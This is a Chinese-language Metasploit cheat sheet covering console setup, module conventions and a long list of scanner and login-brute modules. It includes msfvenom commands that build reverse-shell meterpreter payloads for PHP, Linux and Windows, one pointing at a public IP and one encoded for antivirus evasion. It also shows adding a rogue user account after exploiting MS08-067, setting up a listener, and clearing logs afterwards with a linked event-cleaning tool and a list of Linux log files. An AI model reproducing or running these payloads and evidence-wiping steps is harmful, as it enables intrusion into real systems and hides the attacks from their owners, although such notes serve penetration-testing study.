## 第一次启动，初始化链接postgres 库
* `msfdb init` `msfconsole`
* 查看数据库链接状态：`db_status`

## 1 MS08-067漏洞 smb服务

`process Explorer` 进程监控  
`geiuid` 获取用户识别码  
`shell` 得到shell  
`net user` 当前账户
`net user` username password /add  添加账户密码
MS11-058 MS12-020
## msf基本命令
`msfupdate`  更新
`connect` 连接一个主机,   
`info` 显示模块信息,  
`back` 从当前环境返回,  
`? banner` 输出banner使用方法,  
`irb ruby` 模式,   
`jobs` 任务管理器,   
`resource` 运行储存在一个文件中的命令  
`version` 显示版本信息  
`showt arget` 显示目标类型  
`set target` 设置目标  

## 数据库链接
```bash
 db_connect msf:hack-money@127.0.0.1/msf2
```
## 资料

    https://zhuanlan.zhihu.com/p/25857679
    http://www.kali.org.cn/thread-20133-1-1.html
    http://blog.csdn.net/lijia111111/article/details/64124693
    https://github.com/Veil-Framework/Veil-Evasion
    http://www.360zhijia.com/360anquanke/188372.html
    http://blog.sina.com.cn/s/blog_4c86552f0102wjr9.html
    http://blog.csdn.net/lzhd24/article/details/50664342
    http://www.freebuf.com/sectool/72135.html
    http://blog.csdn.net/ski_12/article/details/57400687

## 命令解释
`msf>show exploit`显示metasploit框架中所有可用的渗透攻击模块。

`msf>show auxiliary`
显示所有的辅助模块以及他们的用途，在metasploit中，辅助模块的用途非常广泛，他们可以是扫描器/拒绝服务攻击工具/fuzz测试器，以及其他类型的工具。

`msf>show options`
参数options是保证metasploit框架中各个模块正常运行所需的各种设置，当你选择一个模块，并输入msf>show options后，会列出这个模块所需的各种参数。如果没有选择任何模块，输入这个命令会显示所有的全局参数。

`msf>show payloads`
攻击载荷是针对特定平台的一段攻击代码，它通过网络传送到攻击目标进行执行。和show options命令一样，当你在当前模块的命令提示符下输入show payloads，metasploit会将当前模块兼容的攻击载荷显示出来。

`msf>show payload`  (显示合适的payload反弹shell。reverse_tcp（反弹时tcp）
在msf>下则会显示所有的payload，use进入摸个模块之后show paylad，显示这个模块适合的payload）

`msf>show targets`
列出渗透攻击模块收到漏洞影响的目标系统的类型，例如MS08-067漏洞的攻击只适用于特定的补丁级别/语言版本以及安全机制的实现，攻击是否成功取决于目标windows系统的版本，show targets中的Auto Targeting（自动选择目标）是攻击目标列表中的一个选项。通常，攻击模块会通过目标操作系统的指纹信息，自动选择操作系统版本进行攻击。不过最好还是通过人工更加准确地识别出目标操作系统的相关信息，这样才能避免触发错误的/破坏性的攻击

`info`
若觉得show和search命令所提供的信息过于简短，可以使用info命令加上模块名字来显示此模块的详细信息/参数说明以及所有可用的目标操作系统（如果已选择了某个模块，直接在模块的提示符下输入info即可。

`setg和unsetg`
setg命令和unsetg命令能够全局参数进行设置或清楚。使用这组命令你不必每次遇到某个参数都要重新设置，特别是那些经常用到又很少会变的参数。

`save`
在使用setg命令对全局参数进行设置后，可以使用save命令将当前的设置值保存下来，这样在下次启动MSF终端时还可以使用这些设置值
（保存在/root/.msf3/config）


# msfvenom
metasploit 更新后就移除了 msfencode 以及 msfpayload

    http://www.freebuf.com/sectool/69362.html
    http://blog.51cto.com/biock/1658668
    http://www.secist.com/archives/1070.html
    http://blog.csdn.net/lijia111111/article/details/64124693

## 目录规则
1. `Post`:获得meteerpreter的shell后可以使用的攻击代码
	hashdump
	acp_canner
3. `date/js/detect` ,这里是探针文件,作用:检查是否适合攻击环境
`Memory` 中主要是一些堆喷射(Heap Spraying)代码,
4. 模块命名规则
/系统/服务/名称
5. payload  
*`payload`是使用模块后使用的*,  
命名规则:系统/类型/名称  
        类型命名规则:  

                `shell`:上传一个shell
                `dllinject`:注入要给DLL到进程
                `Patchup***`:修补漏洞
                `Upexec`:上传并执行一个文件
                `Meterpreter`:高级payload
                `Vncinject`:同上
                `PassiveX`:同上
## 扫描模块

        `portscan` 端口扫描  
        `sniffer` 嗅探
        auxiliary/scanner/portscan
        scanner/portscan/ack
        scanner/portscan/ftpbounce
        scanner/portscan/syn
        scanner/portscan/tcp
        scanner/portscan/xmas
        smb 扫描
        smb 枚举 auxiliary/scanner/smb/smb_enumusers
        返回 DCERPC 信息 auxiliary/scanner/smb/pipe_dcerpc_auditor 扫描 SMB2 协议 auxiliary/scanner/smb/smb2
        扫描 smb 共享文件 auxiliary/scanner/smb/smb_enumshares 枚举系统上的用户 auxiliary/scanner/smb/smb_enumusers
        SMB 登录 auxiliary/scanner/smb/smb_login
        SMB 登录 use windows/smb/psexec
        扫描组的用户 auxiliary/scanner/smb/smb_lookupsid 扫描系统版本 auxiliary/scanner/smb/smb_version
        mssql 扫描(端口 tcp1433udp1434)
        admin/mssql/mssql_enum MSSQL 枚举
        ACK 防火墙扫描 FTP 跳端口扫描 SYN 端口扫描
        TCP 端口扫描 TCP"XMas"端口扫描
        admin/mssql/mssql_exec admin/mssql/mssql_sql scanner/mssql/mssql_login scanner/mssql/mssql_ping
        另外还有一个 mssql_payload 的模块 利用使用的 smtp 扫描
        MSSQL 执行命令
        MSSQL 查询
        MSSQL 登陆工具
        测试 MSSQL 的存在和信息
        smtp 枚举 auxiliary/scanner/smtp/smtp_enum
        扫描 smtp 版本 auxiliary/scanner/smtp/smtp_version
        snmp 扫描
        通过 snmp 扫描设备 auxiliary/scanner/snmp/community
        ssh 扫描
        ssh 登录 auxiliary/scanner/ssh/ssh_login
        ssh 公共密钥认证登录 auxiliary/scanner/ssh/ssh_login_pubkey 扫描 ssh 版本测试 auxiliary/scanner/ssh/ssh_version
        telnet 扫描
        telnet 登录 auxiliary/scanner/telnet/telnet_login
        扫描 telnet 版本 auxiliary/scanner/telnet/telnet_version tftp 扫描
        扫描 tftp 的文件 auxiliary/scanner/tftp/tftpbrute
        ftp 版本扫描 scanner/ftp/anonymous

        ARP 扫描
        auxiliary/scanner/discovery/arp_sweep
        扫描 UDP 服务的主机 auxiliary/scanner/discovery/udp_probe 检测常用的 UDP 服务 auxiliary/scanner/discovery/udp_sweep sniffer 密码 auxiliary/sniffer/psnuffle
        snmp 扫描 scanner/snmp/community
        vnc 扫描无认证扫描 scanner/vnc/vnc_none_auth
        web 服务器信息扫描模块
        Module auxiliary/scanner/http/http_version
        Module auxiliary/scanner/http/open_proxy
        Module auxiliary/scanner/http/robots_txt
        Module auxiliary/scanner/http/frontpage_login
        Module auxiliary/admin/http/tomcat_administration Module auxiliary/admin/http/tomcat_utf8_traversal
        Module auxiliary/scanner/http/options
        Module auxiliary/scanner/http/drupal_views_user_enum Module auxiliary/scanner/http/scraper
        Module auxiliary/scanner/http/svn_scanner
        Module auxiliary/scanner/http/trace
        Module auxiliary/scanner/http/vhost_scanner

        Module auxiliary/scanner/http/webdav_internal_ip Module auxiliary/scanner/http/webdav_scanner
        Module auxiliary/scanner/http/webdav_website_content 文件目录扫描模块
        Module auxiliary/dos/http/apache_range_dos
        Module auxiliary/scanner/http/backup_file
        Module auxiliary/scanner/http/brute_dirs
        Module auxiliary/scanner/http/copy_of_file
        Module auxiliary/scanner/http/dir_listing
        Module auxiliary/scanner/http/dir_scanner
        Module auxiliary/scanner/http/dir_webdav_unicode_bypass Module auxiliary/scanner/http/file_same_name_dir
        Module auxiliary/scanner/http/files_dir
        Module auxiliary/scanner/http/http_put
        Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass Module auxiliary/scanner/http/prev_dir_same_name_file
        Module auxiliary/scanner/http/replace_ext
        Module auxiliary/scanner/http/soap_xml
        Module auxiliary/scanner/http/trace_axd
        Module auxiliary/scanner/http/verb_auth_bypass

        web 应用程序漏洞扫描模块
        Module auxiliary/scanner/http/blind_sql_query Module auxiliary/scanner/http/error_sql_injection Module auxiliary/scanner/http/http_traversal
        Module auxiliary/scanner/http/rails_mass_assignment Module exploit/multi/http/lcms_php_exec

## payload生成

### php rev
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=119.29.226.211 LPORT=2341 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### linux
```bash
msfvenom -p payload/linux/x86/meterpreter/reverse_tcp  LHOST=192.168.0.120 LPORT=4433 -f elf >shell.elf
```
### win
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=192.168.203.139 LPORT=2341 -f exe > abc.exe
```
### 监听

```bash
use exploit/multi/handler
set payload 
sey LHOST
set LPORT
```

### 后渗透过程
https://zhuanlan.zhihu.com/p/31060056
http://www.freebuf.com/articles/system/5884.html
https://github.com/aleenzz/Cobalt_Strike_wiki


### 痕迹清除
win：https://github.com/QAX-A-Team/EventCleaner
Linux /var/log/ lastlog wtmp btmp